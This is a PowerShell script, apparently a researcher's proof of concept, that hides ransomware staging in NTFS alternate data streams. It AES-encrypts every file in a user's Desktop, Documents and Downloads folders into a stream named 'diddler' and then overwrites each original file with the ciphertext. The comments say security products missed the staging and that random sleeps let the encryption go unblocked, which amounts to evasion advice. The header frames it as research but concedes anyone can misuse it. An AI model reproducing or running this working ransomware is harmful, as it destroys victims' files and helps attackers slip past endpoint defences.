
<#
.SYNOPSIS
    Research into how ransomware could use Alternate Data Streams for the purpose of staging and encrpyting files without detection by security products

.AUTHOR
    Dahvid Schloss aka APT Big Daddy

.VERSION
    1.0.0

.DATE
    2025-10-27

.LICENSE
    For testing/approved conditions only. Or education, or you know I can't stop you from doing what you want with it, just know this isn't a good ransomware variant to use in your
    criminal act and I don't approve of that action either. You do you. 

.NOTES
    I want to mess  about with this somemore and see how dangerous fileless ADS ransomware can be but I'll be releasing my findings to appropriate vendors first because I'm too pretty to go to jail.
#>

#first we do some P/Invoke.....I hated this part, always do
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public static class Kernel32
{
    public const uint GENERIC_READ  = 0x80000000;
    public const uint GENERIC_WRITE = 0x40000000;
    public const uint FILE_SHARE_READ = 0x00000001;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(
        SafeFileHandle hFile,
        byte[] lpBuffer,
        int nNumberOfBytesToRead,
        out int lpNumberOfBytesRead,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(
        SafeFileHandle hFile,
        byte[] lpBuffer,
        int nNumberOfBytesToWrite,
        out int lpNumberOfBytesWritten,
        IntPtr lpOverlapped);
}
'@


function Read-NativeFile {
  param([Parameter(Mandatory)][string]$Path,[int]$ChunkSize=4096)
  $h = [Kernel32]::CreateFile($Path,[Kernel32]::GENERIC_READ,[Kernel32]::FILE_SHARE_READ,[IntPtr]::Zero,[Kernel32]::OPEN_EXISTING,0,[IntPtr]::Zero)
  if ($h.IsInvalid){ throw [ComponentModel.Win32Exception]::new([Runtime.InteropServices.Marshal]::GetLastWin32Error()) }
  try{
    $bytes = New-Object System.Collections.Generic.List[byte]
    $buf = New-Object byte[] $ChunkSize
    while($true){
      $n=0; $ok=[Kernel32]::ReadFile($h,$buf,$buf.Length,[ref]$n,[IntPtr]::Zero)
      if(-not $ok){ throw [ComponentModel.Win32Exception]::new([Runtime.InteropServices.Marshal]::GetLastWin32Error()) }
      if($n -le 0){ break }
      $bytes.AddRange(([byte[]]$buf[0..($n-1)]))
      if($n -lt $buf.Length){ break }
    }
    ,$bytes.ToArray()
  } finally { $h.Dispose() }
}


function Write-NativeFile {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][byte[]]$Bytes
    )

    $h = [Kernel32]::CreateFile(
        $Path,
        [Kernel32]::GENERIC_WRITE,
        [Kernel32]::FILE_SHARE_READ,
        [IntPtr]::Zero,
        [Kernel32]::CREATE_ALWAYS,
        0,
        [IntPtr]::Zero
    )
    if ($h.IsInvalid) {
        throw [ComponentModel.Win32Exception]::new([Runtime.InteropServices.Marshal]::GetLastWin32Error())
    }

    try {
        $written = 0
        $ok = [Kernel32]::WriteFile($h, $Bytes, $Bytes.Length, [ref]$written, [IntPtr]::Zero)
        if (-not $ok) {
            throw [ComponentModel.Win32Exception]::new([Runtime.InteropServices.Marshal]::GetLastWin32Error())
        }
    }
    finally {
        $h.Dispose()
    }
}


function Write-ADS {
  param(
    [Parameter(Mandatory)][string]$Path,      
    [Parameter(Mandatory)][byte[]]$Bytes
  )
  $h = [Kernel32]::CreateFile(
    $Path,
    [Kernel32]::GENERIC_WRITE,
    [Kernel32]::FILE_SHARE_READ,
    [IntPtr]::Zero,
    [Kernel32]::CREATE_ALWAYS,   # base file must exist; use CREATE_ALWAYS to create/replace the stream
    0,
    [IntPtr]::Zero
  )
  if ($h.IsInvalid) { throw [ComponentModel.Win32Exception]::new([Runtime.InteropServices.Marshal]::GetLastWin32Error()) }
  try {
    $written = 0
    $ok = [Kernel32]::WriteFile($h, $Bytes, $Bytes.Length, [ref]$written, [IntPtr]::Zero)
    if (-not $ok -or $written -ne $Bytes.Length) {
      throw [ComponentModel.Win32Exception]::new([Runtime.InteropServices.Marshal]::GetLastWin32Error())
    }
  } finally { $h.Dispose() }
}


function Read-ADS {
  param([Parameter(Mandatory)][string]$Path, [int]$ChunkSize = 4096)
  $h = [Kernel32]::CreateFile(
    $Path,
    [Kernel32]::GENERIC_READ,
    [Kernel32]::FILE_SHARE_READ,
    [IntPtr]::Zero,
    [Kernel32]::OPEN_EXISTING,
    0,
    [IntPtr]::Zero
  )
  if ($h.IsInvalid) { throw [ComponentModel.Win32Exception]::new([Runtime.InteropServices.Marshal]::GetLastWin32Error()) }
  try {
    $buf = New-Object byte[] $ChunkSize
    $ms  = New-Object System.IO.MemoryStream
    while ($true) {
      $n = 0
      $ok = [Kernel32]::ReadFile($h,$buf,$buf.Length,[ref]$n,[IntPtr]::Zero)
      if (-not $ok) { throw [ComponentModel.Win32Exception]::new([Runtime.InteropServices.Marshal]::GetLastWin32Error()) }
      if ($n -le 0) { break }
      $ms.Write($buf,0,$n)
      if ($n -lt $buf.Length) { break }
    }
    ,$ms.ToArray()
  } finally { $h.Dispose() }
}

function StreamSmith{
    #Honestly Not sure why but no security product complained about this step. It should, but you know I'm not their dad so they do them, but this function is responsible 
    
    # First we generate an AES key. I guess you could import your own encrpytion too which would probably avoid some level of cryptographic hooked calls but didn't run into that issue
    # with the products I tested against
    $key = [System.Security.Cryptography.Aes]::Create().Key;
    $iv = [System.Security.Cryptography.Aes]::Create().IV;


    # Print key/IV because we need to decrypt it eventually, or if you are me, say screw it and just recover from backup
    Write-Host "Key: $([System.BitConverter]::ToString($key).Replace('-', ' '))"
    Write-Host "IV: $([System.BitConverter]::ToString($iv).Replace('-', ' '))"

    #wait for us dummies to write the keys down before we lose them forever in the fucking wall of text
    [void](Read-Host "Copy Keys and press enter to continue...")

    $userProfiles = Get-ChildItem -Path "C:\Users" -Directory | Select-Object -ExpandProperty FullName
    # I had 3 profiles on the test domain I wanted to test only one of them, so remove the [1] if testing against all profiles
    $profile = $userProfiles[1]

    Write-Host "User Profile is $profile"
    $desktop = Join-Path -Path $profile -ChildPath "Desktop"
    $documents = Join-Path -Path $profile -ChildPath "Documents"
    $downloads = Join-Path -Path $profile -ChildPath "Downloads"
    #app data takes too long
    #$appdata = Join-Path -Path $profile -ChildPath "AppData"
    


    #foreach ($path in @($desktop, $documents, $downloads, $appdata)) {
    foreach ($path in @($desktop, $documents, $downloads)) {
        if (Test-Path $path) {
            Write-Host "In $Path"
            foreach ($file in Get-ChildItem -Path $path -Recurse -File) {
                try {
                    if ($file.Name -match "sillyran|filefaker|decryptor") { continue }
                    #You don't need this I know I did because its expirmentation
                    #Write-Host "File: $file has been selected"
                    $bytesRead = 0
                    $bytesWritten = 0

                    $buffer = Read-NativeFile($file.FullName)

                    # Encrypt data
                    $transform = [System.Security.Cryptography.AesCryptoServiceProvider]::new()
                    $transform.Key = $key; $transform.IV = $iv;
                    $memoryStream = [System.IO.MemoryStream]::new()
                    $cryptoStream = [System.Security.Cryptography.CryptoStream]::new($memoryStream, $transform.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
                    $cryptoStream.Write($buffer, 0, $buffer.Length)
                    $cryptoStream.FlushFinalBlock()
                    $encryptedBytes = $memoryStream.ToArray()

                    # Write encrypted data via P/Invoke to the alternate data stream of "Diddler"
                    $adsPath = "$($file.FullName):diddler" 
                    Write-ADS -Path $adsPath -Bytes $encryptedBytes
                    Write-Host "file: $File has been diddled"



                } catch 
                { 
                 Write-Host "Something got fucked up"
                }
            }
        }
    }


}


#The Diddy Party
    Function RaiseTheByte
    {
        $userProfiles = Get-ChildItem -Path "C:\Users" -Directory | Select-Object -ExpandProperty FullName
        $profile = $userProfiles[1]

        Write-Host "User Profile is $profile"
        $desktop = Join-Path -Path $profile -ChildPath "Desktop"
        $documents = Join-Path -Path $profile -ChildPath "Documents"
        $downloads = Join-Path -Path $profile -ChildPath "Downloads"
        $appdata = Join-Path -Path $profile -ChildPath "AppData"

        #foreach ($path in @($desktop, $documents, $downloads, $appdata)) {
        foreach ($path in @($desktop, $documents, $downloads)) {
            if (Test-Path $path) {
                Write-Host "In $Path"
                foreach ($file in Get-ChildItem -Path $path -Recurse -File) {
                    try {
                        #these were my local files I created to run on disk, then said screw it later and ran only in memory, but its left there
                        if ($file.Name -match "sillyran|filefaker|decryptor") { continue }
                

                                $ads = "diddler"
                                # Read bytes from the :Diddler stream
                                $data = Get-Content -Path $file.FullName -Stream $ads -Encoding Byte -Raw

                                # Overwrite the main file (:$DATA)
                                Set-Content -Path $file.FullName -Value $data -Encoding Byte
                                
                                Write-Host "The Byte got ahold of $file"
                                # so initally I had no sleep condition in here and I was getting smacked harder than a lawn chair in a hurricane, but I thought what if I slowed the process down a bit would the
                                # security products I tested against still block the activity? The answer was no, they don't care if it looks slow. Kinda neat
                            Start-Sleep(Get-Random -Minimum 0 -Maximum 5)
                        }
                        catch {
                        Write-Host "$file escaped Diddy"
                        Start-Sleep(Get-Random -Minimum 0 -Maximum 5)
                        }


            }    
                }
            }
    }
